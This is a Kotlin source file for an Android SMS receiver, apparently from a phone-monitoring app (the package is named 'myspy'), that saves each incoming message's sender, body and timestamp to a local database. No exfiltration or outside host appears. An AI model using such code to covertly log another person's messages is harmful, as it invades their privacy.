package com.myspy.android.receivers

import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.provider.Telephony
import com.myspy.android.data.local.db.AppDatabase
import com.myspy.android.data.local.db.entities.SmsEntity
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch

/**
 * SMS Receiver
 * @author Michael KOJDL
 * @version 1.0.0
 */
class SmsReceiver : BroadcastReceiver() {

    override fun onReceive(context: Context, intent: Intent) {
        if (intent.action == Telephony.Sms.Intents.SMS_RECEIVED_ACTION) {
            val messages = Telephony.Sms.Intents.getMessagesFromIntent(intent)

            CoroutineScope(Dispatchers.IO).launch {
                val database = AppDatabase.getInstance(context)
                val smsDao = database.smsDao()

                messages.forEach { message ->
                    val sms = SmsEntity(
                        type = "INCOMING",
                        address = message.displayOriginatingAddress ?: "",
                        body = message.messageBody ?: "",
                        timestamp = message.timestampMillis,
                        threadId = null
                    )
                    smsDao.insert(sms)
                }
            }
        }
    }
}
